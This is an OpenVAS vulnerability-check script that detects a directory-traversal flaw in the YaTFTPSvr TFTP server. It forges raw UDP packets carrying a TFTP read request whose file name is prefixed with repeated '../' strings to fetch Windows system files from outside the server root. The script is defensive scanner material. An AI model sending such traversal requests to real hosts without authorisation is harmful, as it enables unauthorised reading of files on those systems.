###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_YaTFTPSvr_50441.nasl 13155 2019-01-18 15:41:35Z cfischer $
#
# YaTFTPSvr TFTP Server Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103321");
  script_bugtraq_id(50441);
  script_version("$Revision: 13155 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("YaTFTPSvr TFTP Server Directory Traversal Vulnerability");
  script_tag(name:"last_modification", value:"$Date: 2019-01-18 16:41:35 +0100 (Fri, 18 Jan 2019) $");
  script_tag(name:"creation_date", value:"2011-11-01 08:00:00 +0100 (Tue, 01 Nov 2011)");
  script_category(ACT_ATTACK);
  script_family("Remote file access");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("tftpd_detect.nasl", "global_settings.nasl", "os_detection.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_require_keys("tftp/detected");
  script_mandatory_keys("Host/runs_windows");
  script_exclude_keys("keys/TARGET_IS_IPV6");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50441");
  script_xref(name:"URL", value:"http://sites.google.com/site/zhaojieding2/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/520302");

  script_tag(name:"summary", value:"YaTFTPSvr TFTP Server is prone to a directory-traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"A remote attacker could exploit this vulnerability using directory-
  traversal strings (such as '../') to upload and download arbitrary files outside of the TFTP server
  root directory. This could help the attacker launch further attacks.");

  script_tag(name:"affected", value:"YaTFTPSvr 1.0.1.200 is vulnerable. Other versions may also be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");

if( TARGET_IS_IPV6() )
  exit( 0 );

port = get_kb_item( "Services/udp/tftp" );
if( ! port )
  port = 69;

if( ! get_port_state( port ) )
  exit( 0 );

files = traversal_files( "Windows" );

foreach pattern( keys( files ) ) {

  file = files[pattern];
  # nb: Workaround as egrep might not match the response due to non printable characters in the response
  pattern = str_replace( find:"\[", string:file, replace:"[" );
  pattern = str_replace( find:"\]", string:file, replace:"]" );
  pattern = str_replace( find:"supporT", string:file, replace:"support" );
  file = "../../../../../../../../../../../../../../" + file;

  req = '\x00\x01' + file + '\0netascii\0';
  sport = rand() % 64512 + 1024;

  ip = forge_ip_packet( ip_hl:5, ip_v:4, ip_tos:0, ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP, ip_src: this_host() );
  u = forge_udp_packet( ip:ip, uh_sport:sport, uh_dport:port, uh_ulen:8 + strlen( req ), data:req );

  filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

  for( i = 0; i < 2; i++ ) {

    rep = send_packet( u, pcap_active:TRUE, pcap_filter:filter );

    if( ! rep )
      continue;

    data = get_udp_element( udp:rep, element:"data" );
    if( data[0] == '\0' && data[1] == '\x03' ) {

      c = substr( data, 4 );
      if( pattern >< c ) {
        report = "Received data: " + c;
        security_message( port:port, data:report, proto:"udp" );
        exit( 0 );
      }
    }
  }
}

exit( 0 );